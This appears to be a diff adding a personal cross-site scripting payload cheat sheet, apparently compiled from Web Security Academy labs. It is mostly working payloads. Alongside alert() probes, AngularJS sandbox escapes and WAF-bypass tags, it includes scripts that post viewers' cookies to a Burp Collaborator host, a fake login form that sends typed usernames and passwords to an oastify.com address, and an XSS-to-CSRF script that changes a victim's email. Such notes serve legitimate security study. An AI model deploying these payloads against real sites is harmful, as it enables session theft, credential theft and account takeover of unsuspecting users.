@@ -1,0 +1,51 @@
+<iframe src="https://vulnearble-site.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>		//DOM XSS in jQuery selector sink using a hashchange event (Exploit-Server)
+"onmouseover="alert(1)												
+javascript:alert(1)
+'-alert(1)-'
+"></select><img%20src=1%20onerror=alert(1)>
+{{$on.constructor('alert(1)')()}}							//AngularJS expression with angle brackets and double quotes HTML-encoded	
+\"-alert(1)}//
+\'-alert(1)//
+</script><script>alert(1)</script>
+foo?&apos;-alert(1)-&apos;
+${alert(1)}
+
+//This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.					
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
+//This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://nrixqc1u2sdfnvl1am6p5sr6vx1opgd5.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+//Exploiting XSS to perform CSRF
+//This will make anyone who views the comment issue a POST request to change their email address to
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';				//custom tags to bypass waf
+<svg><animatetransform%20§§=1>								//cheat sheet check
+"><svg><animatetransform%20onbegin=alert(1)>
+
+//Reflected XSS in canonical link tag(To assist with your exploit, you can assume that the simulated user will press the following key combinations: Alt+X CTRL+ALT+X) ALT+SHIFT+X
+https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+
